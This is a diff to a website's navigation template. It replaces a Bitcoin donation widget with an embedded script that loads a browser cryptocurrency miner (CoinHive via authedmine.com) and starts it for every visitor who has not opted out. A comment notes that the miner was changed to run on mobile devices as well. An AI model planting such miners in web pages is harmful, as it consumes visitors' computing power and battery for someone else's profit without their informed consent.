@@ -31,28 +31,18 @@
  
 {% include icons.html %}
 <li>
-<script src="//blockr.io/js_external/coinwidget/coin.js"></script>
-		<script>
-			CoinWidgetCom.go({
-				wallet_address: '1ADqCZiyWG2en4sNkbHvfH4GZ5JBNPA1DV',
-				currency: 'bitcoin',
-				counter: 'count',
-				lbl_button: 'Donate',
-				lbl_count: 'donations',
-				lbl_amount: 'BTC',
-				lbl_address: 'Use address below to donate. Thanks!',
-				qrcode: true,
-				alignment: 'bl',
-				decimals: 8,
-				size: "small",
-				color: "dark",
-				countdownFrom: "0",
-				element: "#coinwidget-bitcoin-1ADqCZiyWG2en4sNkbHvfH4GZ5JBNPA1DV",
-				onShow: function(){},
-				onHide: function(){}
-			});
-		</script>
-		<div id="coinwidget-bitcoin-1ADqCZiyWG2en4sNkbHvfH4GZ5JBNPA1DV"></div>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('41TX4NK1Vk9wjX5Oa8AV4N4qJKwfSFDM', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	//if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	// Modified to start on mobile devices
+	if (!miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 </li>
 </ul>
 </nav>
